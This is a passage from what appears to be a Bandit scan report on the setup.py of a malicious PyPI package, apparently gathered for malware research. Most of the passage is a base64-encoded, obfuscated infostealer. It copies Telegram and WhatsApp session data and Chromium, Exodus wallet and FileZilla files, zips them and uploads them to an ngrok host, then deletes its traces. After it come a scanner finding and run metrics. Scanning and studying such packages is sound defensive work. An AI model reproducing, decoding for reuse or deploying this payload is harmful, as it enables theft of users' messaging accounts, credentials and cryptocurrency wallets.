jb25mLmxvZ19wYXRoLCBcJ3RlbGVncmFtXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRlbGVncmFtX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih0ZWxlZ3JhbV9wYXRoKVxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4odGVsZWdyYW1fcGF0aCwgZlwndGRhdGFfe3Rva2VuX2hleCg0KX1cJylcclxuICAgICAgICBta2RpcihyZXNfcGF0aClcclxuXHJcbiAgICAgICAgYmxhY2tsaXN0ID0gW1wnZHVtcHNcJywgXCdlbW9qaVwnLCBcJ3VzZXJfZGF0YVwnLCBcJ3dvcmtpbmdcJ11cclxuXHJcbiAgICAgICAgZm9yIGYgaW4gc2NhbmRpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgZmlsZV9vayA9IFRydWVcclxuICAgICAgICAgICAgZm9yIGkgaW4gYmxhY2tsaXN0OlxyXG4gICAgICAgICAgICAgICAgaWYgaSBpbiBmLm5hbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgZmlsZV9vayA9IEZhbHNlXHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGlmIG5vdCBmaWxlX29rOlxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGZyb21fcGF0aCA9IGpvaW4odGRhdGFfcGF0aCwgZi5uYW1lKVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmLm5hbWUpXHJcblxyXG4gICAgICAgICAgICBmdW5jID0gY29weWZpbGUgaWYgZi5pc19maWxlKCkgZWxzZSBjb3B5dHJlZVxyXG4gICAgICAgICAgICBhd2FpdCBmdW5jKGZyb21fcGF0aCwgZGVzdF9wYXRoKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdUZWxlZ3JhbSBzdGVhbGVkIGZyb20ge3BhdGh9XCcpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9yZWdpc3RyeV9wYXRoKCk6XHJcbiAgICAgICAgcGF0aCA9IHdpbnJlZy5IS0VZX0NMQVNTRVNfUk9PVFxyXG5cclxuICAgICAgICB0ZyA9IHdpbnJlZy5PcGVuS2V5RXgocGF0aCwgciJ0ZGVza3RvcC50Z1xcXFwiKVxyXG4gICAgICAgIHNoZWxsID0gd2lucmVnLk9wZW5LZXlFeCh0Zywgclwnc2hlbGxcXFxcXCcpXHJcbiAgICAgICAgb3Blbl9yZyA9IHdpbnJlZy5PcGVuS2V5RXgoc2hlbGwsIHJcJ29wZW5cXFxcXCcpXHJcbiAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXlFeChvcGVuX3JnLCByXCdjb21tYW5kXFxcXFwnKVxyXG5cclxuICAgICAgICB2YWx1ZSA9IHdpbnJlZy5FbnVtVmFsdWUoa2V5LCAwKVxyXG5cclxuICAgICAgICBwYXRoID0gcmUuZmluZGFsbChyXCciKFteIl0qKVwnLCB2YWx1ZVsxXSlbMl1cclxuICAgICAgICByZXR1cm4gcGF0aFxyXG4gICAgICAgIFxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9sbmtfcGF0aCgpOlxyXG4gICAgICAgIGRlc2t0b3AgPSBqb2luKExPQ0FMLCBcJ2Rlc2t0b3BcJylcclxuXHJcbiAgICAgICAgZm9yIGl0IGluIHNjYW5kaXIoZGVza3RvcCk6XHJcbiAgICAgICAgICAgIGlmIGl0Lm5hbWUuc3BsaXQoXCcuXCcpWy0xXSA9PSBcJ2xua1wnIGFuZCBcJ3RlbGVncmFtXCcgaW4gaXQubmFtZS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgc2hlbGwgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldTY3JpcHQuU2hlbGwiKVxyXG4gICAgICAgICAgICAgICAgc2hvcnRjdXQgPSBzaGVsbC5DcmVhdGVTaG9ydEN1dChpdC5wYXRoKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IHNob3J0Y3V0LlRhcmdldHBhdGgubG93ZXIoKS5zdHJpcChcJ3RlbGVncmFtLmV4ZVwnKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhdGgnKSNsaW5lOjY3CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy9XaGF0c2FwcC5weScsYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWVcclxuXHJcblxyXG5cclxuY2xhc3MgV2hhdHNhcHAoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGZvbGRlciA9IGpvaW4ocGF0aCwgJ2xvY2FsIHN0b3JhZ2UnLCAnbGV2ZWxkYicpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihmb2xkZXIpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBcclxuICAgICAgICB3aGF0c2FwcF9yZXNfZm9sZGVyID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3aGF0c2FwcCcpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKTpcclxuICAgICAgICAgICAgbWtkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcilcclxuXHJcbiAgICAgICAgcmVzID0gam9pbih3aGF0c2FwcF9yZXNfZm9sZGVyLCBmJ3doYXRzYXBwX3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgYXdhaXQgY29weXRyZWUoZm9sZGVyLCByZXMpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnV2hhdHNhcHAgc3RlYWxlZCBmcm9tIHtwYXRofScpIikjbGluZTo2OAogICAgaW1wb3J0IGFzeW5jaW8gI2xpbmU6NjkKICAgIGZyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2sgI2xpbmU6NzAKICAgIGZyb20gdHlwaW5nIGltcG9ydCBMaXN0ICNsaW5lOjcxCiAgICBmcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGx1Z2luX3BhdGhzICxyb290X3BhdGhzICNsaW5lOjcyCiAgICBmcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnICNsaW5lOjczCiAgICBmcm9tIGFpb2h0dHAgaW1wb3J0IENsaWVudFNlc3Npb24gYXMgU2Vzc2lvbiAjbGluZTo3NAogICAgaW1wb3J0IHNlY3JldHMgI2xpbmU6NzUKICAgIGltcG9ydCB0aW1laXQgI2xpbmU6NzYKICAgIGZyb20gcGF0aHMgaW1wb3J0IFRFTVAgI2xpbmU6NzcKICAgIGZyb20gb3MgaW1wb3J0IG1rZGlyICNsaW5lOjc4CiAgICBmcm9tIG9zIC5wYXRoIGltcG9ydCBqb2luICNsaW5lOjc5CiAgICBmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUgLFpJUF9ERUZMQVRFRCAjbGluZTo4MAogICAgZnJvbSB0b29scyBpbXBvcnQgemlwZGlyICxfaGFuZGxlX3Rhc2tfcmVzdWx0ICNsaW5lOjgxCiAgICBmcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyICNsaW5lOjgyCiAgICBmcm9tIG9zIGltcG9ydCBzY2FuZGlyICNsaW5lOjgzCiAgICBmcm9tIHBsdWdpbnMgaW1wb3J0IENocm9taXVtICxEZXRhaWxzICxFeG9kdXMgLEZpbGV6aWxsYSAsVGVsZWdyYW0gLFdoYXRzYXBwICNsaW5lOjg1CiAgICBIT1NUID0naHR0cDovLzIxOGMtMTkzLTEzOC0yMTgtMTYxLm5ncm9rLmlvJyNsaW5lOjg5CiAgICBhc3luYyBkZWYgbWFpbiAoKS0+Tm9uZSA6I2xpbmU6OTIKICAgICAgICBPME8wTzAwMDAwMDBPMDAwTyA9dGltZWl0IC5kZWZhdWx0X3RpbWVyICgpI2xpbmU6OTMKICAgICAgICBPMDAwTzBPTzAwMDAwT09PMCA9c2VjcmV0cyAudG9rZW5faGV4ICgxMCApI2xpbmU6OTUKICAgICAgICBPME9PTzAwTzAwME9PME8wTyA9am9pbiAoVEVNUCAsTzAwME8wT08wMDAwME9PTzAgKSNsaW5lOjk2CiAgICAgICAgcHJpbnQgKE8wT09PMDBPMDAwT08wTzBPICkjbGluZTo5OAogICAgICAgIG1rZGlyIChPME9PTzAwTzAwME9PME8wTyApI2xpbmU6OTkKICAgICAgICBPME8wMDAwMDAwT09PTzBPMCA6TGlzdCBbYXN5bmNpbyAuVGFzayBdPVtdI2xpbmU6MTAxCiAgICAgICAgTzAwME9PMDBPT08wME8wTzAgPVNlc3Npb24gKCkjbGluZToxMDMKICAgICAgICBPTzBPMDBPMDAwMDAwTzBPMCA9TG9nZ2VyIChPME9PTzAwTzAwME9PME8wTyApI2xpbmU6MTA0CiAgICAgICAgT09PMDAwTzAwTzAwME8wMDAgPUNvbmZpZyAoTzAwME8wT08wMDAwME9PTzAgLEhPU1QgLE8wT09PMDBPMDAwT08wTzBPICxPTzBPMDBPMDAwMDAwTzBPMCAsTzAwME9PMDBPT08wME8wTzAgLHRhZyA9J2JhdWthJykjbGluZToxMDUKICAgICAgICBhd2FpdCBPTzBPMDBPMDAwMDAwTzBPMCAubG9nIChmJ1N0YXJ0JykjbGluZToxMDcKICAgICAgICBPT09PMDAwME9PTzAwTzBPTyA9Q2hyb21pdW0gKE9PTzAwME8wME8wMDBPMDAwICkjbGluZToxMDkKICAgICAgICBPME9PT08wME8wT08wTzAwTyA9eydnb29nbGUnOk9PT08wMDAwT09PMDBPME9PICwnZXhvZHVzJzpFeG9kdXMgKE9PTzAwME8wME8wMDBPMDAwICksJ21vemlsbGEnOk5vbmUgLCd0ZWxlZ3JhbSBkZXNrdG9wJzpUZWxlZ3JhbSAoT09PMDAwTzAwTzAwME8wMDAgKSwndGVsZWdyYW0nOlRlbGVncmFtIChPT08wMDBPMDBPMDAwTzAwMCApLCdvcGVyYSBzb2Z0d2FyZSc6T09PTzAwMDBPT08wME8wT08gLCdmaWxlemlsbGEnOkZpbGV6aWxsYSAoT09PMDAwTzAwTzAwME8wMDAgKSwnd2hhdHNhcHAnOldoYXRzYXBwIChPT08wMDBPMDBPMDAwTzAwMCApfSNsaW5lOjEyMAogICAgICAgIE8wTzAwMDAwMDBPT09PME8wIC5hcHBlbmQgKGNyZWF0ZV90YXNrIChzZWFyY2hfcGx1Z2luX3BhdGhzIChyb290X3BhdGhzICxPME9PT08wME8wT08wTzAwTyAsT08wTzAwTzAwMDAwME8wTzAgKSkpI2xpbmU6MTIyCiAgICAgICAgTzBPMDAwT09PMDAwT09PTzAgPVtEZXRhaWxzIChPT08wMDBPMDBPMDAwTzAwMCApXSNsaW5lOjEyNAogICAgICAgIGZvciBPT08wTzAwTzAwT09PT09PMCBpbiBPME8wMDBPT08wMDBPT09PMCA6I2xpbmU6MTI2CiAgICAgICAgICAgIE8wTzAwMDAwMDBPT09PME8wIC5hcHBlbmQgKGNyZWF0ZV90YXNrIChPT08wTzAwTzAwT09PT09PMCAuY2FsbGJhY2sgKCkpKSNsaW5lOjEyNwogICAgICAgIGZvciBPT09PMDBPME9PMDAwT09PMCBpbiBPME8wMDAwMDAwT09PTzBPMCA6I2xpbmU6MTI5CiAgICAgICAgICAgIE9PT08wME8wT08wMDBPT08wIC5hZGRfZG9uZV9jYWxsYmFjayAobGFtYmRhIE9PT09PTzAwTzAwTzAwME8wIDpfaGFuZGxlX3Rhc2tfcmVzdWx0IChPT09PT08wME8wME8wMDBPMCAsT08wTzAwTzAwMDAwME8wTzAgKSkjbGluZToxMzAKICAgICAgICB0cnkgOiNsaW5lOjEzMwogICAgICAgICAgICBPTzAwMDAwTzBPTzAwTzBPMCA9VGVsZWdyYW0gLmdldF9yZWdpc3RyeV9wYXRoICgpI2xpbmU6MTM0CiAgICAgICAgICAgIGF3YWl0IFRlbGVncmFtIChPT08wMDBPMDBPMDAwTzAwMCApLmNhbGxiYWNrIChPTzAwMDAwTzBPTzAwTzBPMCApI2xpbmU6MTM1CiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBPMDBPMDBPME8wTzAwMDAwTyA6I2xpbmU6MTM2CiAgICAgICAgICAgIGF3YWl0IE9PME8wME8wMDAwMDBPME8wIC5sb2cgKGYnRXJyb3Igd2hlbiBzdGVhbGluZyB0ZWxlZ3JhbSByZWdpc3RyeSwge08wME8wME8wTzBPMDAwMDBPfScpI2xpbmU6MTM3CiAgICAgICAgdHJ5IDojbGluZToxMzkKICAgICAgICAgICAgT09PT08wME9PTzBPT08wTzAgPVRlbGVncmFtIC5nZXRfbG5rX3BhdGggKCkjbGluZToxNDAKICAgICAgICAgICAgaWYgT09PT08wME9PTzBPT08wTzAgOiNsaW5lOjE0MQogICAgICAgICAgICAgICAgYXdhaXQgVGVsZWdyYW0gKE9PTzAwME8wME8wMDBPMDAwICkuY2FsbGJhY2sgKE9PMDAwMDBPME9PMDBPME8wICkjbGluZToxNDIKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wME8wME8wTzBPMDAwMDBPIDojbGluZToxNDMKICAgICAgICAgICAgYXdhaXQgT08wTzAwTzAwMDAwME8wTzAgLmxvZyAoZidFcnJvciB3aGVuIHN0ZWFsaW5nIHRlbGVncmFtIGxuaywge08wME8wME8wTzBPMDAwMDBPfScpI2xpbmU6MTQ0CiAgICAgICAgZm9yIE9PT08wME8wT08wMDBPT08wIGluIE8wTzAwMDAwMDBPT09PME8wIDojbGluZToxNDYKICAgICAgICAgICAgdHJ5IDojbGluZToxNDcKICAgICAgICAgICAgICAgIGF3YWl0IE9PT08wME8wT08wMDBPT08wICNsaW5lOjE0OAogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wME8wME8wTzBPMDAwMDBPIDojbGluZToxNDkKICAgICAgICAgICAgICAgIGF3YWl0IE9PME8wME8wMDAwMDBPME8wIC5sb2cgKGYnRXJyb3IgaW4gbWFpbi5weSB0YXNrcyB7TzAwTzAwTzBPME8wMDAwME99JykjbGluZToxNTAKICAgICAgICBhd2FpdCBPTzBPMDBPMDAwMDAwTzBPMCAubG9nIChmJ9Cd0LDRh9C40L3QsNGOINC+0YLQv9GA0LDQstC60YMg0LvQvtCz0LAnKSNsaW5lOjE1MgogICAgICAgIE9PT08wMDAwTzBPTzBPME8wID1qb2luIChURU1QICxmJ3tPMDAwTzBPTzAwMDAwT09PMH0uemlwJykjbGluZToxNTQKICAgICAgICB3aXRoIFppcEZpbGUgKE9PT08wMDAwTzBPTzBPME8wICwndycsWklQX0RFRkxBVEVEIClhcyBPME8wMDBPTzAwME9PMDBPMCA6I2xpbmU6MTU1CiAgICAgICAgICAgIHppcGRpciAoTzBPT08wME8wMDBPTzBPME8gLE8wTzAwME9PMDAwT08wME8wICkjbGluZToxNTYKICAgICAgICBPMDBPME8wT08wMDAwMDBPTyA9eydmaWxlJzpvcGVuIChPT09PMDAwME8wT08wTzBPMCAsJ3JiJyl9I2xpbmU6MTU4CiAgICAgICAgYXdhaXQgTzAwME9PMDBPT08wME8wTzAgLnBvc3QgKGYne0hPU1R9L3JlY2VpdmVfbG9nJyxwYXJhbXMgPXsnY2xpZW50X2lkJzpPMDAwTzBPTzAwMDAwT09PMCB9LGRhdGEgPU8wME8wTzBPTzAwMDAwME9PICkjbGluZToxNjAKICAgICAgICBhd2FpdCBPMDAwT08wME9PTzAwTzBPMCAuY2xvc2UgKCkjbGluZToxNjEKICAgICAgICBPME9PT09PT09PT09PME9PTyA9dGltZWl0IC5kZWZhdWx0X3RpbWVyICgpI2xpbmU6MTYzCiAgICAgICAgYXdhaXQgT08wTzAwTzAwMDAwME8wTzAgLmxvZyAoZidUaW1lOiB7TzBPT09PT09PT09PTzBPT08tTzBPME8wMDAwMDAwTzAwME99JykjbGluZToxNjQKICAgICAgICB0cnkgOiNsaW5lOjE2NgogICAgICAgICAgICBpZiAnREVCVUcnbm90IGluIHtPT09PT08wT08wMDBPT08wTyAubmFtZSBmb3IgT09PT09PME9PMDAwT09PME8gaW4gc2NhbmRpciAoam9pbiAoVEVNUCAsJ19fcHljYWNoZV9fJykpfTojbGluZToxNjcKICAgICAgICAgICAgICAgIGZyb20gc2h1dGlsIGltcG9ydCBybXRyZWUgI2xpbmU6MTY4CiAgICAgICAgICAgICAgICB0cnkgOiNsaW5lOjE2OQogICAgICAgICAgICAgICAgICAgIHJtdHJlZSAoam9pbiAoVEVNUCAsJ19fcHljYWNoZV9fJykpI2xpbmU6MTcwCiAgICAgICAgICAgICAgICBleGNlcHQgOiNsaW5lOjE3MQogICAgICAgICAgICAgICAgICAgIHBhc3MgI2xpbmU6MTcyCiAgICAgICAgICAgICAgICBybXRyZWUgKE8wT09PMDBPMDAwT08wTzBPICkjbGluZToxNzMKICAgICAgICBleGNlcHQgOiNsaW5lOjE3NAogICAgICAgICAgICBwYXNzICNsaW5lOjE3NQogICAgYXN5bmNpbyAuZ2V0X2V2ZW50X2xvb3AgKCkucnVuX3VudGlsX2NvbXBsZXRlIChtYWluICgpKQ=='))
104	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_socks5_connector-0.2.31/aiohttp_socks5_connector-0.2.31/setup.py:121
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
120	    with open(join(main_dir, 'main error.txt'), 'a', encoding='utf8') as f:
121	        f.write(traceback.format_exc() + '\n')

--------------------------------------------------

Code scanned:
	Total lines of code: 644
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 5.0
		High: 25.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 28.0
		High: 2.0
Files skipped (0):
